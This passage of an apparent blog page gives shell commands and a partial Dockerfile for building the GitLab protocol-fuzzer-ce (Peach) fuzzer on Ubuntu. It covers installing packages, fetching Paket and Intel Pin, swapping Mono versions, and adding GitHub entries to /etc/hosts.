&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;sudo apt update
sudo apt install -y &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    coreutils apt-utils wget curl openssl ca-certificates bash-completion &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    joe vim nano &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    unzip p7zip &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    hping3 httping thc-ipv6 gdb &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    tcpdump wireshark-common &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    locales-all &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    git build-essential joe vim strace tcpdump python python-pip python-is-python2&lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    ruby doxygen libxml2-utils less openjdk-8-jre xsltproc asciidoctor &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    nodejs node-typescript wget &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    apt-transport-https dirmngr gnupg libtool-bin &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    cmake dos2unix g++-multilib --fix-missing

cd ~/Downloads
git clone https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce
cd protocol-fuzzer-ce
git checkout 5697f699dc43593d69c44b8521a50976dfff266e

cd paket/.paket
wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.bootstrapper.exe
wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.targets
wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.exe
wget https://github.com/fsprojects/Paket/releases/download/5.257.0/Paket.Restore.targets

cd ../../
wget https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.20-98437-gf02b61307-gcc-linux.tar.gz
mv pin-3.20-98437-gf02b61307-gcc-linux.tar.gz 3rdParty/pin/
cd 3rdParty/pin/
tar -xf pin-3.20-98437-gf02b61307-gcc-linux.tar.gz
cd ../../
sed -i s/pin-3.19-98425-gcc-linux/pin-3.20-98437-gf02b61307-gcc-linux/g build/config/linux.py

sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:80 --recv-keys 3FA7E0328081BFF6A14DA29AA6A19B38D3D831EF

&lt;span style=&#34;color:#75715e&#34;&gt;# switch to root&lt;/span&gt;
sudo su
echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deb https://download.mono-project.com/repo/ubuntu stable-bionic main&amp;#34;&lt;/span&gt; &amp;gt; /etc/apt/sources.list.d/mono-official-stable.list
exit
&lt;span style=&#34;color:#75715e&#34;&gt;# exit root&lt;/span&gt;

sudo apt update -y
sudo apt install -y mono-devel
mozroots --import --sync

&lt;span style=&#34;color:#75715e&#34;&gt;# check the mono version, should by 6.12.0&lt;/span&gt;
mono --version

sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;/^int main.*/itemplate&amp;lt;bool b&amp;gt;\nstruct StaticAssert {};\ntemplate &amp;lt;&amp;gt;\nstruct StaticAssert&amp;lt;true&amp;gt;\n{\n       static void myassert() {}\n};\n&amp;#39;&lt;/span&gt; core/BasicBlocks/bblocks.cpp
sed -i &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s/STATIC_ASSERT(sizeof(size_t) == sizeof(ADDRINT))/StaticAssert&amp;lt;sizeof(size_t) == sizeof(ADDRINT)&amp;gt;::myassert()/g&amp;#39;&lt;/span&gt; core/BasicBlocks/bblocks.cpp

./waf configure
./waf build

&lt;span style=&#34;color:#75715e&#34;&gt;# Downgrade mono back to 4.x for installation and runtime&lt;/span&gt;
sudo apt purge -y mono* libmono* doxygen
sudo rm /etc/apt/sources.list.d/mono-official-stable.list
sudo apt update -y
sudo apt install -y mono-complete

./waf install
&lt;span style=&#34;color:#75715e&#34;&gt;# install binary is in ./output/linux_x86_64_release/bin&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# copy to peach dir&lt;/span&gt;
cp -r output/linux_x86_64_release/bin /your_own_dir/to/peach
cp -r output/doc/sdk /your_own_dir/peach/doc
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;dockerfile&#34;&gt;dockerfile&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-dockerfile&#34; data-lang=&#34;dockerfile&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;FROM&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; ubuntu:18.04 AS peachpro&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;MAINTAINER&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; vh@thc.org&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;ARG&lt;/span&gt; DEBIAN_FRONTEND&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;noninteractive

&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apt-get update&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; apt-get install -y &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    coreutils apt-utils wget curl openssl ca-certificates bash-completion &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    joe vim nano &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    unzip p7zip &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    hping3 httping thc-ipv6 gdb &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    tcpdump wireshark-common &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    locales-all &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    git build-essential joe vim strace tcpdump python python-pip &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    ruby doxygen libxml2-utils less openjdk-8-jre xsltproc asciidoctor &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    nodejs node-typescript wget &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    apt-transport-https dirmngr gnupg libtool-bin &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    cmake dos2unix g++-multilib --fix-missing&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; git clone https://gitlab.com/gitlab-org/security-products/protocol-fuzzer-ce&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Pin to a known version&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; cd protocol-fuzzer-ce &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\
&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;&lt;/span&gt;    git checkout 5697f699dc43593d69c44b8521a50976dfff266e&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.154              github.githubassets.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;140.82.112.22                central.github.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              desktop.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.153              assets-cdn.github.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              camo.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              github.map.fastly.net&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;199.232.69.194               github.global.ssl.fastly.net&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;140.82.114.3                 gist.github.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.153              github.io&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;140.82.114.4                 github.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;140.82.113.6                 api.github.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              raw.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              user-images.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              favicons.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              avatars5.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              avatars4.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              avatars3.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              avatars2.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              avatars1.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              avatars0.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              avatars.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;140.82.112.10                codeload.github.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.217.44.188                github-cloud.s3.amazonaws.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.217.33.196                github-com.s3.amazonaws.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.216.93.147                github-production-release-asset-2e65be.s3.amazonaws.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.216.93.147                github-production-user-asset-6210df.s3.amazonaws.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;52.217.207.33                github-production-repository-file-5c1aeb.s3.amazonaws.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.153              githubstatus.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;64.71.144.211                github.community&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              media.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              objects.githubusercontent.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;185.199.108.133              raw.github.com&amp;#34;&lt;/span&gt; &amp;gt;&amp;gt; /etc/hosts&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Get specific mono packages&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;WORKDIR&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; /protocol-fuzzer-ce/paket/.paket&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.bootstrapper.exe&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.targets&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; wget https://github.com/fsprojects/Paket/releases/download/5.257.0/paket.exe&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; wget https://github.com/fsprojects/Paket/releases/download/5.257.0/Paket.Restore.targets&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;WORKDIR&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; /protocol-fuzzer-ce&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Download new PIN and change PIN version in build config&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; wget https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.20-98437-gf02b61307-gcc-linux.tar.gz&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; mv pin-3.20-98437-gf02b61307-gcc-linux.tar.gz 3rdParty/pin/&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; cd 3rdParty/pin/ &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; tar -xf pin-3.20-98437-gf02b61307-gcc-linux.tar.gz&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;RUN&lt;/span&gt; sed -i s/pin-3.19-98425-gcc-linux/pin-3.20-98437-gf02b61307-gcc-linux/g build/config/linux.py&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;amp;&amp;amp; \&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#    mv pin-3.20-98437-gf02b61307-gcc-linux pin-3.2-98437-gcc-linux&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
